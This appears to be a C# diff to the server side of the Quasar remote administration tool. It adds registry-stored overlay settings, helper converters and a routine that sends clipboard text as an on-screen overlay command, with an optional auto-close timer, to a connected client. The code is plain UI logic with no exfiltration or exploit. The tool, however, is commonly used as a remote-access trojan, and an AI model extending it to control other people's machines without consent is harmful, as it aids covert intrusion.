@@ -130,6 +130,22 @@ namespace Quasar.Server.Forms
         private Point redTextStartPoint;
         private Rectangle redTextRect = Rectangle.Empty;
 
+        private const string RegistryKeyPathForRedText = @"SOFTWARE\Quasar\IVTextSettings";
+        private const string FontSizeKey = "FontSize";
+        private const string IsSavedKey = "TextSaved";
+        private const string SavedTextKey = "SavedText";
+        private const string StartXKey = "StartXPos";
+        private const string StartYKey = "StartYPos";
+        private const string EndXKey = "EndXPos";
+        private const string EndYKey = "EndYPos";
+        private const string BkColorValueKey = "BackgroundColor";
+        private const string TxtColorValueKey = "TextColor";
+        private const string BkColorExistKey = "BackgroundExist";
+        private const string TimerExistKey = "AutoKillTimerExist";
+        private const string TimerValueKey = "AutoKillTimerValue";
+        private const string AlphaValueKey = "AlphaValue";
+        private const string BkCustomColorsKey = "BackgroundCustomColors";
+        private const string TextCustomColorsKey = "TextCustomColors";
         /// <summary>
         /// Creates a new remote desktop form for the client or gets the current open form, if there exists one already.
         /// </summary>
@@ -347,12 +363,106 @@ namespace Quasar.Server.Forms
             return base.ProcessCmdKey(ref msg, keyData);
         }
 
+        private static int ToInt(object o, int def)
+        {
+            try { return o == null ? def : Convert.ToInt32(o); }
+            catch { return def; }
+        }
+
+        private static bool ToBool(object o, bool def)
+        {
+            if (o == null) return def;
+            if (o is bool b) return b;
+
+            // handle DWORD 0/1
+            if (o is int i) return i != 0;
+            if (o is long l) return l != 0;
+
+            var s = o.ToString()?.Trim();
+            if (s == "1") return true;
+            if (s == "0") return false;
+
+            return bool.TryParse(s, out var parsed) ? parsed : def;
+        }
+
         private void TriggerRedTextWithClipboard()
         {
             string text = TryGetClipboardText(retries: 10, delayMs: 40);
+
             if (!string.IsNullOrEmpty(text))
             {
-                handleRedTextDialog(text);
+                // defaults
+                object fontSizeValue = 36;
+                object startXValue = 100;
+                object startYValue = 50;
+                object endXValue = 1024;
+                object endYValue = 768;
+                object opacityValue = 150;
+
+                uint txtColorValue = 0xFFFF0000;
+                uint bkColorValue = 0xFFFF0080;
+
+                bool bkExists = false;
+                bool autoKillEnabled = false;
+                int timerSeconds = 0;
+
+                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegistryKeyPathForRedText))
+                {
+                    if (key != null)
+                    {
+                        // keep defaults if missing
+                        fontSizeValue = key.GetValue(FontSizeKey, 36);
+                        startXValue = key.GetValue(StartXKey, 100);
+                        startYValue = key.GetValue(StartYKey, 50);
+                        endXValue = key.GetValue(EndXKey, 1024);
+                        endYValue = key.GetValue(EndYKey, 768);
+                        opacityValue = key.GetValue(AlphaValueKey, 150);
+
+                        if (key.GetValue(TxtColorValueKey) is int txtcolor)
+                            txtColorValue = unchecked((uint)txtcolor);
+
+                        bkExists = ToBool(key.GetValue(BkColorExistKey, false), false);
+                        if (bkExists && key.GetValue(BkColorValueKey) is int bk)
+                            bkColorValue = unchecked((uint)bk);
+
+                        autoKillEnabled = ToBool(key.GetValue(TimerExistKey, false), false);
+                        if (autoKillEnabled)
+                            timerSeconds = ToInt(key.GetValue(TimerValueKey, 0), 0);
+                    }
+                }
+
+                _connectClient.Send(new DoShowRedText
+                {
+                    Action = "show",
+                    Text = text,
+                    FontSize = ToInt(fontSizeValue, 36),
+                    StartX = ToInt(startXValue, 100),
+                    StartY = ToInt(startYValue, 50),
+                    EndX = ToInt(endXValue, 1024),
+                    EndY = ToInt(endYValue, 768),
+                    BackGroundColor = bkColorValue,
+                    TextColor = txtColorValue,
+                    ExistBackgroundColor = bkExists,
+                    Opacity = ToInt(opacityValue, 150)
+                });
+
+                if (autoKillEnabled && timerSeconds > 0)
+                {
+                    ivtimer = new System.Windows.Forms.Timer();
+
+                    // clamp and avoid overflow
+                    long ms = (long)timerSeconds * 1000L;
+                    if (ms > int.MaxValue) ms = int.MaxValue;
+
+                    ivtimer.Interval = (int)ms;
+                    ivtimer.Tick += (s, ev) =>
+                    {
+                        ivtimer.Stop();
+                        CloseIT();
+                    };
+                    ivtimer.Start();
+                }
+
             }
             else
                 MessageBox.Show("No text in clipboard (or clipboard was busy).");
